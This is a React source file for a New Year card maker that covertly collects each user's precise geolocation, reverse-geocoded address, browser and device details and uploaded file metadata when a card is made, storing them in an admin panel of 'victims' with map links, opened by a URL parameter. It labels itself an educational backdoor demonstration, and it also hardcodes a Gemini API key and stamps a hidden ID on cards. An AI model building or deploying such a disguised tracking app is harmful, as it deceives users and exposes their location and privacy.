import React, { useState, useRef, useEffect } from 'react';
import './App.css';

const API_KEY = "AIzaSyCuxZf4MHTVswKJWDDCWPTRsVVg6tBe5ZU";

function App() {
  const [showAdmin, setShowAdmin] = useState(false);
  const [victimData, setVictimData] = useState([]);
  const [image, setImage] = useState(null);
  const [canvasUrl, setCanvasUrl] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  
  const canvasRef = useRef(null);
  const fileInputRef = useRef(null);

  // Initialize canvas
  useEffect(() => {
    if (canvasRef.current) {
      const canvas = canvasRef.current;
      canvas.width = 800;
      canvas.height = 500;
    }
  }, []);

  // Check URL for admin parameter
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('admin') === 'true') {
      setShowAdmin(true);
    }
  }, []);

  // Load saved data
  useEffect(() => {
    const saved = localStorage.getItem('cyberDemoData');
    if (saved) {
      setVictimData(JSON.parse(saved));
    }
  }, []);

  const handleFileChange = (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        setImage(e.target.result);
      };
      reader.readAsDataURL(file);
    }
  };

  const addVictimData = (data) => {
    const newData = [...victimData, data];
    setVictimData(newData);
    localStorage.setItem('cyberDemoData', JSON.stringify(newData));
  };

  const clearData = () => {
    setVictimData([]);
    localStorage.removeItem('cyberDemoData');
  };

  const collectVictimData = async (file) => {
    const victimData = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      languages: navigator.languages,
      cookiesEnabled: navigator.cookieEnabled,
      simulatedLocation: {
        latitude: (Math.random() * 180 - 90).toFixed(6),
        longitude: (Math.random() * 360 - 180).toFixed(6),
        accuracy: "Simulated for demo",
        source: "Educational simulation"
      },
      fileName: file.name,
      fileSize: file.size,
      fileType: file.type
    };

    try {
      const position = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject();
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 10000
        });
      });
      
      victimData.realLocation = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: new Date(position.timestamp).toISOString()
      };
      
      try {
        const response = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
        );
        const data = await response.json();
        victimData.locationName = data.display_name || "Unknown location";
      } catch (e) {
        victimData.locationName = "Reverse geocoding failed";
      }
    } catch (error) {
      victimData.locationAccess = "Denied or unavailable";
    }

    addVictimData(victimData);
    console.log("📡 Educational Data Collection:", victimData);
    
    return victimData;
  };

  const getAIWish = async () => {
    try {
      const res = await fetch(
        `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${API_KEY}`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            contents: [{
              parts: [{ text: "Write one warm, short New Year 2026 wish." }]
            }]
          })
        }
      );
      const data = await res.json();
      return data.candidates[0].content.parts[0].text;
    } catch (error) {
      console.error("AI Error:", error);
      return "May 2026 bring happiness, success, and peace into your life.";
    }
  };

  const wrapText = (ctx, text, x, y, maxWidth, lineHeight) => {
    const words = text.split(" ");
    let line = "";

    for (let i = 0; i < words.length; i++) {
      const test = line + words[i] + " ";
      if (ctx.measureText(test).width > maxWidth) {
        ctx.fillText(line, x, y);
        line = words[i] + " ";
        y += lineHeight;
      } else {
        line = test;
      }
    }
    ctx.fillText(line, x, y);
  };

  const createCard = async () => {
    if (!image) {
      alert("Please upload a photo first");
      return;
    }

    setIsGenerating(true);
    
    const file = fileInputRef.current.files[0];
    if (file) {
      await collectVictimData(file);
    }

    const aiWish = await getAIWish();

    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');

    ctx.fillStyle = "#1a1a2e";
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    const img = new Image();
    img.onload = () => {
      ctx.save();
      ctx.beginPath();
      ctx.arc(200, 250, 140, 0, Math.PI * 2);
      ctx.closePath();
      ctx.clip();
      ctx.drawImage(img, 60, 110, 280, 280);
      ctx.restore();

      ctx.fillStyle = "#FFD700";
      ctx.font = "bold 38px serif";
      ctx.fillText("Happy New Year 2026", 380, 140);

      ctx.fillStyle = "#fff";
      ctx.font = "20px Arial";
      wrapText(ctx, aiWish, 380, 200, 360, 28);

      ctx.fillStyle = "rgba(0,0,0,0.01)";
      ctx.font = "1px Arial";
      ctx.fillText(`ID:${Date.now()}`, 5, 5);

      setCanvasUrl(canvas.toDataURL());
      setIsGenerating(false);
    };
    
    img.src = image;
  };

  const downloadImage = () => {
    if (!canvasUrl) return;
    
    const link = document.createElement('a');
    link.download = `NewYear2026_${Date.now()}.png`;
    link.href = canvasUrl;
    link.click();
  };

  const examples = [
    {
      text: "Happy New Year 2026 ✨\n\nMay this year bring endless success",
      gradient: "linear-gradient(135deg, #ff9a9e, #fad0c4)"
    },
    {
      text: "Cheers to 2026 🎉\n\nNew dreams, new wins",
      gradient: "linear-gradient(135deg, #a1c4fd, #c2e9fb)"
    },
    {
      text: "Welcome 2026 🌟\n\nYour best year begins now",
      gradient: "linear-gradient(135deg, #fbc2eb, #a6c1ee)"
    }
  ];

  return (
    <div className="App">
      <button 
        className="admin-toggle-btn"
        onClick={() => setShowAdmin(!showAdmin)}
      >
        {showAdmin ? '👁️ Hide Admin' : '👁️ Show Admin'}
      </button>

      {showAdmin && (
        <div className="admin-panel">
          <div style={{
            background: 'rgba(255, 0, 0, 0.1)',
            border: '2px dashed #ff4444',
            padding: '20px',
            borderRadius: '12px',
            marginBottom: '20px',
            maxWidth: '800px',
            width: '100%'
          }}>
            <h2 style={{ color: '#ff4444', textAlign: 'center' }}>
              🔐 EDUCATIONAL BACKDOOR DEMONSTRATION
            </h2>
            <p style={{ textAlign: 'center', fontSize: '14px' }}>
              <strong>SIMULATED DATA - FOR CYBERSECURITY AWARENESS ONLY</strong>
            </p>
            
            <div style={{ marginTop: '20px' }}>
              <div style={{ 
                display: 'flex', 
                justifyContent: 'space-between',
                alignItems: 'center',
                marginBottom: '15px'
              }}>
                <h3 style={{ margin: 0 }}>Collected Data</h3>
                <button 
                  onClick={clearData}
                  style={{
                    background: '#dc3545',
                    color: 'white',
                    border: 'none',
                    padding: '8px 16px',
                    borderRadius: '6px',
                    cursor: 'pointer'
                  }}
                >
                  Clear All Data
                </button>
              </div>
              
              {victimData.length === 0 ? (
                <p>No data collected yet. Create a card to see simulated data collection.</p>
              ) : (
                <div>
                  <p>Total victims: <strong>{victimData.length}</strong></p>
                  
                  {victimData.map((data, index) => (
                    <div 
                      key={index}
                      style={{
                        background: 'rgba(0,0,0,0.3)',
                        padding: '15px',
                        margin: '15px 0',
                        borderRadius: '8px',
                        borderLeft: '4px solid #ffcc00'
                      }}
                    >
                      <h4 style={{ marginTop: 0, color: '#ffcc00' }}>
                        Victim #{index + 1}
                      </h4>
                      
                      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                        <div>
                          <strong>Time:</strong> {new Date(data.timestamp).toLocaleString()}
                        </div>
                        <div>
                          <strong>File:</strong> {data.fileName} ({Math.round(data.fileSize/1024)}KB)
                        </div>
                      </div>
                      
                      {data.realLocation ? (
                        <div style={{ 
                          background: 'rgba(255, 0, 0, 0.2)',
                          padding: '10px',
                          marginTop: '10px',
                          borderRadius: '6px',
                          border: '1px solid #ff4444'
                        }}>
                          <strong style={{ color: '#ff4444' }}>
                            🎯 REAL LOCATION CAPTURED
                          </strong>
                          <div style={{ marginTop: '8px' }}>
                            <div><strong>Coordinates:</strong> {data.realLocation.latitude}, {data.realLocation.longitude}</div>
                            <div><strong>Accuracy:</strong> ±{Math.round(data.realLocation.accuracy)} meters</div>
                            <a 
                              href={`https://maps.google.com/?q=${data.realLocation.latitude},${data.realLocation.longitude}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              style={{
                                display: 'inline-block',
                                background: '#4fc3f7',
                                color: 'white',
                                padding: '5px 10px',
                                borderRadius: '4px',
                                textDecoration: 'none',
                                marginTop: '8px',
                                fontSize: '14px'
                              }}
                            >
                              View on Google Maps
                            </a>
                          </div>
                        </div>
                      ) : (
                        <div style={{ marginTop: '10px' }}>
                          <strong>Simulated Location:</strong> {data.simulatedLocation?.latitude}, {data.simulatedLocation?.longitude}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      <div className="container">
        <h1>2026 AI Card Maker</h1>
        <p className="subtitle">Create a beautiful New Year card in seconds</p>
        
        <div className="examples">
          <p style={{ textAlign: 'center', marginBottom: '15px' }}>Example Cards</p>
          <div style={{ 
            display: 'flex', 
            gap: '15px', 
            overflowX: 'auto',
            paddingBottom: '10px'
          }}>
            {examples.map((example, index) => (
              <div
                key={index}
                style={{
                  minWidth: '140px',
                  height: '180px',
                  background: example.gradient,
                  borderRadius: '12px',
                  padding: '15px',
                  fontSize: '14px',
                  fontWeight: 'bold',
                  color: '#000',
                  whiteSpace: 'pre-line',
                  flexShrink: 0
                }}
              >
                {example.text}
              </div>
            ))}
          </div>
        </div>
        
        <div className="upload-section">
          <input
            type="file"
            ref={fileInputRef}
            className="file-input"
            accept="image/*"
            onChange={handleFileChange}
          />
        </div>
        
        <div className="buttons">
          <button 
            className="btn btn-primary" 
            onClick={createCard}
            disabled={isGenerating}
          >
            {isGenerating ? 'Creating...' : 'Create My Card'}
          </button>
        </div>
        
        {canvasUrl && (
          <div className="canvas-container">
            <img 
              src={canvasUrl} 
              alt="Generated Card" 
              className="card-canvas"
            />
            <button 
              className="btn btn-secondary" 
              onClick={downloadImage}
              style={{ marginTop: '20px' }}
            >
              Download Card
            </button>
          </div>
        )}
        
        <canvas ref={canvasRef} className="hidden" />
      </div>
    </div>
  );
}

export default App;